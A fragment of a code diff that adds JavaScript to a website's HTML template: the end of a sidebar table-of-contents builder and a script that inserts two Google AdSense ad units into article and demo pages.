+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
